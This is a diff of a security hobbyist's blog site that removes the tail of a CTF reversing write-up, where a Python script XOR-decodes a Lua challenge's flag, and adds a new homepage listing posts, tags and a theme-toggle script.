-  <span class="mi">224</span><span class="p">,</span>
-  <span class="mi">170</span><span class="p">,</span>
-  <span class="mi">120</span><span class="p">,</span>
-  <span class="mi">129</span><span class="p">,</span>
-  <span class="mi">153</span><span class="p">,</span>
-  <span class="mi">253</span><span class="p">,</span>
-  <span class="mi">193</span><span class="p">,</span>
-  <span class="mi">32</span><span class="p">,</span>
-  <span class="mi">239</span><span class="p">,</span>
-  <span class="mi">148</span><span class="p">,</span>
-  <span class="mi">197</span><span class="p">,</span>
-  <span class="mi">7</span>
-<span class="p">}</span>
-<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-  <span class="mi">248</span><span class="p">,</span>
-  <span class="mi">55</span><span class="p">,</span>
-  <span class="mi">248</span><span class="p">,</span>
-  <span class="mi">6</span><span class="p">,</span>
-  <span class="mi">192</span><span class="p">,</span>
-  <span class="mi">74</span><span class="p">,</span>
-  <span class="mi">6</span><span class="p">,</span>
-  <span class="mi">63</span><span class="p">,</span>
-  <span class="mi">221</span><span class="p">,</span>
-  <span class="mi">201</span><span class="p">,</span>
-  <span class="mi">165</span><span class="p">,</span>
-  <span class="mi">167</span><span class="p">,</span>
-  <span class="mi">166</span><span class="p">,</span>
-  <span class="mi">11</span><span class="p">,</span>
-  <span class="mi">198</span><span class="p">,</span>
-  <span class="mi">226</span><span class="p">,</span>
-  <span class="mi">5</span><span class="p">,</span>
-  <span class="mi">174</span><span class="p">,</span>
-  <span class="mi">142</span><span class="p">,</span>
-  <span class="mi">205</span><span class="p">,</span>
-  <span class="mi">39</span><span class="p">,</span>
-  <span class="mi">245</span><span class="p">,</span>
-  <span class="mi">241</span><span class="p">,</span>
-  <span class="mi">152</span><span class="p">,</span>
-  <span class="mi">158</span><span class="p">,</span>
-  <span class="mi">77</span><span class="p">,</span>
-  <span class="mi">128</span><span class="p">,</span>
-  <span class="mi">251</span><span class="p">,</span>
-  <span class="mi">171</span><span class="p">,</span>
-  <span class="mi">122</span>
-<span class="p">}</span>
-<span class="n">r</span> <span class="o">=</span> <span class="s2">""</span>
-<span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">key</span> <span class="k">do</span>
-  <span class="n">r</span> <span class="o">=</span> <span class="n">r</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="err">~</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
-<span class="k">end</span>
-<span class="k">if</span> <span class="n">user_input</span> <span class="o">==</span> <span class="n">r</span> <span class="k">then</span>
-  <span class="nb">io.write</span><span class="p">(</span><span class="s2">"correct flag: "</span> <span class="o">..</span> <span class="n">r</span> <span class="o">..</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
-<span class="k">else</span>
-  <span class="nb">io.write</span><span class="p">(</span><span class="s2">"Invalid flag\n"</span><span class="p">)</span>
-<span class="k">end</span></code></pre></figure>
-
-<p>this is a simple xor between two value , here’s my solver to get the flag:</p>
-
-<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">159</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">149</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">179</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">236</span><span class="p">,</span><span class="mi">251</span><span class="p">,</span><span class="mi">222</span><span class="p">,</span><span class="mi">213</span><span class="p">,</span><span class="mi">195</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">163</span><span class="p">,</span><span class="mi">144</span><span class="p">,</span><span class="mi">118</span><span class="p">,</span><span class="mi">199</span><span class="p">,</span><span class="mi">224</span><span class="p">,</span><span class="mi">170</span><span class="p">,</span><span class="mi">120</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">153</span><span class="p">,</span><span class="mi">253</span><span class="p">,</span><span class="mi">193</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">239</span><span class="p">,</span><span class="mi">148</span><span class="p">,</span><span class="mi">197</span><span class="p">,</span><span class="mi">7</span><span class="p">]</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mi">248</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">248</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">192</span><span class="p">,</span><span class="mi">74</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">221</span><span class="p">,</span><span class="mi">201</span><span class="p">,</span><span class="mi">165</span><span class="p">,</span><span class="mi">167</span><span class="p">,</span><span class="mi">166</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">198</span><span class="p">,</span><span class="mi">226</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">174</span><span class="p">,</span><span class="mi">142</span><span class="p">,</span><span class="mi">205</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">245</span><span class="p">,</span><span class="mi">241</span><span class="p">,</span><span class="mi">152</span><span class="p">,</span><span class="mi">158</span><span class="p">,</span><span class="mi">77</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">251</span><span class="p">,</span><span class="mi">171</span><span class="p">,</span><span class="mi">122</span><span class="p">]</span>
-
-<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
-  <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
-
-<span class="k">print</span> <span class="n">flag</span></code></pre></figure>
-
-<p>and we got our flag</p>
-
-<p><img src="/images/2019-10-03-174334_664x273_scrot.png" class="center" /></p>
-</div>
-
-	</article>
-
-
-
-
-
-
-    </div>
-
-
-
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>tripoloski blog | Hello i am arsalan , i blog about cyber security, ctf writeup , web development , and more about tech. born and raised in indonesia , currently living in indonesia</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="tripoloski blog" />
+<meta name="author" content="arsalan" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hello i am arsalan , i blog about cyber security, ctf writeup , web development , and more about tech. born and raised in indonesia , currently living in indonesia" />
+<meta property="og:description" content="Hello i am arsalan , i blog about cyber security, ctf writeup , web development , and more about tech. born and raised in indonesia , currently living in indonesia" />
+<link rel="canonical" href="http://localhost:4000/" />
+<meta property="og:url" content="http://localhost:4000/" />
+<meta property="og:site_name" content="tripoloski blog" />
+<link rel="next" href="http://localhost:4000/blog/page2/" />
+<script type="application/ld+json">
+{"description":"Hello i am arsalan , i blog about cyber security, ctf writeup , web development , and more about tech. born and raised in indonesia , currently living in indonesia","@type":"WebSite","url":"http://localhost:4000/","headline":"tripoloski blog","name":"tripoloski blog","author":{"@type":"Person","name":"arsalan"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="tripoloski blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">tripoloski blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/tripoloski_1337"><i class="fab fa-twitter-square"></i></a><a class="color-purple-hover" href="https://github.com/tripoloski1337"><i class="fab fa-github-square"></i></a>
+    </span>
   </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+
+<img src="/assets/img/20200126111913.jpg" class="author-avatar" />
+
+Hello i am arsalan , i blog about cyber security, ctf writeup , web development , and more about tech. born and raised in  indonesia , currently living in indonesia
+
+</br>
+<a>My Project</a>
+</div>
 
 
 
-  <footer id="footer">
-    <p class="copyright">Copyright &copy; 2019 Tripoloski. Powered by <a href="http://jekyllrb.com">Jekyll</a>, theme by <a href="http://www.webmaster-source.com">Matt Harzewski</a></p>
-  </footer>
+<h1>recent articles</h1>
+    <div class="post-links">
+      
+        <div class="post-link-wrapper">
+          <a href="/ctf/2020/01/25/secure-login-facebook-bountycon.html" class="post-link">Secure login facebook bountycon</a>
+          <div class="post-meta">
+
+            
+            <div class="post-tags">
+                
+            </div>
+            
+            
+              Jan 25, 2020
+            
+          </div>
+        </div>
+      
+        <div class="post-link-wrapper">
+          <a href="/experience/2019/09/09/hackthebox-Traverxec.html" class="post-link">CVE-2019-16278 Hackthebox Traverxec Writeup</a>
+          <div class="post-meta">
+
+            
+            <div class="post-tags">
+                
+                <a class="tag" href="/tag/ctf-writeup/">ctf-writeup</a>
+                
+                <a class="tag" href="/tag/hackthebox/">hackthebox</a>
+                
+            </div>
+            
+            
+              Sep 9, 2019
+            
+          </div>
+        </div>
+      
+        <div class="post-link-wrapper">
+          <a href="/experience/2019/09/09/writting-open-read-write-shellcode.html" class="post-link">Open Read Write shellcoding</a>
+          <div class="post-meta">
+
+            
+            <div class="post-tags">
+                
+                <a class="tag" href="/tag/ctf-writeup/">ctf-writeup</a>
+                
+                <a class="tag" href="/tag/pwn/">pwn</a>
+                
+            </div>
+            
+            
+              Sep 9, 2019
+            
+          </div>
+        </div>
+      
+        <div class="post-link-wrapper">
+          <a href="/experience/2019/09/09/simple-demonstrating-CVE-2018-13379.html" class="post-link">Simple demonstrating CVE-2018-13379</a>
+          <div class="post-meta">
+
+            
+            <div class="post-tags">
+                
+            </div>
+            
+            
+              Sep 9, 2019
+            
+          </div>
+        </div>
+      
+        <div class="post-link-wrapper">
+          <a href="/ctf/2019/09/09/reverse-engineering-unity-game.html" class="post-link">Reverse engineering unity game</a>
+          <div class="post-meta">
+
+            
+            <div class="post-tags">
+                
+                <a class="tag" href="/tag/ctf-writeup/">ctf-writeup</a>
+                
+                <a class="tag" href="/tag/reversing/">reversing</a>
+                
+            </div>
+            
+            
+              Sep 9, 2019
+            
+          </div>
+        </div>
+      
+    </div>
+
+    <!-- pagination -->
+
+<div class="pagination">
+  
+    <span><i class="fas fa-chevron-left"></i></span>
+  
+
+  
+    
+      <span class="webjeda">1</span>
+    
+  
+    
+      <a href="/blog/page2/">2</a>
+    
+  
+    
+      <a href="/blog/page3/">3</a>
+    
+  
+
+  
+    <a href="/blog/page2/"><i class="fas fa-chevron-right"></i></a>
+  
+</div>
 
 
 
-  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js"></script>
-  <script src="/assets/js/jquery.mobilemenu.min.js"></script>
-
-  <script>
-    $(document).ready(function(){
-      $('#sidebar nav ul').mobileMenu({'topOptionText': 'Menu', 'prependTo': '#sidebar nav'});
-    });
-  </script>
+    
 
 
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/analysis/" class="set-1">analysis</a> <a href="/tag/ctf/" class="set-1">ctf</a> <a href="/tag/ctf-writeup/" class="set-5">ctf-writeup</a> <a href="/tag/design/" class="set-1">design</a> <a href="/tag/got/" class="set-1">got</a> <a href="/tag/hackthebox/" class="set-1">hackthebox</a> <a href="/tag/heap/" class="set-1">heap</a> <a href="/tag/introduction/" class="set-2">introduction</a> <a href="/tag/libc/" class="set-1">libc</a> <a href="/tag/linux/" class="set-1">linux</a> <a href="/tag/lua/" class="set-1">lua</a> <a href="/tag/pwn/" class="set-2">pwn</a> <a href="/tag/reversing/" class="set-2">reversing</a> <a href="/tag/review/" class="set-1">review</a> <a href="/tag/tutorial/" class="set-1">tutorial</a> <a href="/tag/welcome/" class="set-1">welcome</a></div>
+  
 
-</body>
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
 </html>
